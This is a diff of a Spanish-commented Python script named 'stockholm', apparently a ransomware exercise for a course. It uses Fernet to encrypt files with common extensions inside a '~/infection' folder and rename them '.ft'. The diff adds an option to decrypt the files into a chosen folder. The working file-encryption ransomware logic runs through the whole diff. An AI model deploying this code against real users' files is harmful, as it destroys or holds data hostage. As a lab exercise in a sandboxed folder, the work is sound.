@@ -2,6 +2,7 @@ import argparse
 import os
 
 from cryptography.fernet import Fernet
+from pathlib import Path
 
 
 # PROBLEMA:
@@ -16,7 +17,8 @@ from cryptography.fernet import Fernet
 
 
 # Variables globales (y sus valores por defecto).
-ver_sem = "stockholm 0.3"
+infectorio = str(Path.home()) + "/infection"    # 'Infectado' + 'Directorio'
+ver_sem = "stockholm 0.4"
 extensiones = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
                '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
                '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
@@ -38,7 +40,7 @@ def leer_argumentos():
     # Inicializar el analizador de argumentos.
     analizador = inicializar_analizador()
 
-    return analizador.r, analizador.v, analizador.s
+    return analizador.r, analizador.v, analizador.s, analizador.p
 
 
 # Inicializar el parser de la línea de comandos.
@@ -64,6 +66,10 @@ def inicializar_analizador():
         "-s",
         help="desactiva la información mostrada por pantalla.",
         action="store_true")
+    analizador.add_argument(
+        "-p",
+        metavar="carpeta",
+        help="descifra todos los ficheros y los almacena en la carpeta indicada.")
 
     # Obtener los argumentos de la línea de comandos.
     return analizador.parse_args()
@@ -101,13 +107,13 @@ def secuestrar():
     ficheros = []
 
     # Obtener todos los elementos en el directorio de este script.
-    for elemento in os.listdir("."):
-        # Comprobar la validez del fichero para su cifrado.
-        if validar_fichero(elemento, "c"):
-            ficheros.append(elemento)
+    for fichero in os.listdir(infectorio):
+        # Completar la ruta del elemento.
+        fichero = os.path.join(infectorio, fichero)
 
-    if not silencio:
-        print("Ficheros:", sorted(ficheros))
+        # Comprobar la validez del fichero para su cifrado.
+        if validar_fichero(fichero, "c"):
+            ficheros.append(fichero)
 
     # Generar una clave de cifrado.
     clave = Fernet.generate_key()
@@ -129,17 +135,26 @@ def secuestrar():
         # Renombrar el fichero añadiendo la extensión.
         os.rename(fichero, fichero + ".ft")
 
+    # Mostrar los ficheros afectados.
+    print("Se cifraron los archivos:")
+    if not silencio:
+        for f in sorted(ficheros):
+            print(f)
+
     # Devuelve la cantidad de ficheros cifrados.
     return len(ficheros)
 
 
 # Descifrar los archivos del directorio de este script que tengan
 # la extensión '.ft', salvo que su extensión original ya fuera '.ft'.
-def liberar():
+def liberar(carpeta):
     ficheros = []
 
     # Obtener todos los elementos en el directorio de este script.
-    for elemento in os.listdir("."):
+    for elemento in os.listdir(infectorio):
+        # Completar la ruta del elemento.
+        elemento = infectorio + "/" + elemento
+
         # Comprobar la validez del elemento para su descifrado.
         if validar_fichero(elemento, "d"):
             ficheros.append(elemento)
@@ -151,6 +166,13 @@ def liberar():
     # Descifrar los ficheros obtenidos anteriormente.
     for fichero in ficheros:
         try:
+            # Descomponer la ruta del fichero.
+            nombre = os.path.split(fichero)[1]
+
+            """
+            '[1]' porque devuelve una tupla '(path, file)' y solo quiero el nombre.
+            """
+
             # Extraer y descifrar el contenido del fichero.
             with open(fichero, "rb") as f:
                 descifrado = Fernet(clave).decrypt(f.read())
@@ -159,8 +181,22 @@ def liberar():
             with open(fichero, "wb") as f:
                 f.write(descifrado)
 
-            # Renombrar el fichero cifrado
-            os.rename(fichero, fichero[:-3])    # '[:-3]' para el devolver el nombre hasta el '.ft' que mide 3 caracteres.
+            # Mover el fichero a la carpeta, si se indicó una.
+            if carpeta:
+                # Crear la carpeta si no existe.
+                if not os.path.exists(carpeta):
+                    os.makedirs(carpeta)
+
+                # Renombrar el fichero cifrado
+                os.rename(fichero, carpeta + "/" + nombre[:-3])
+
+            else:
+                # Renombrar el dichero cifrado
+                os.rename(fichero, fichero[:-3])
+
+            """
+            '[:-3]' para el devolver el nombre hasta el '.ft' que mide 3 caracteres.
+            """
 
         # Si se intenta descifrar un fichero que no ha sido cifrado (es '.ft' sin extensión original).
         except Exception as e:
@@ -179,7 +215,7 @@ def liberar():
 
 if __name__ == "__main__":
     # Leer los argumentos de entrada de la línea de comandos.
-    revertir, version, silencio = leer_argumentos()
+    revertir, version, silencio, carpeta = leer_argumentos()
 
     # Se solicitó la versión del programa (-v).
     if version:
@@ -187,7 +223,7 @@ if __name__ == "__main__":
 
     # Se solicitó descifrar los ficheros (-r).
     elif revertir:
-        contador = liberar()
+        contador = liberar(carpeta)
 
         if not silencio:
             print("Se descifraron {} ficheros.".format(contador))
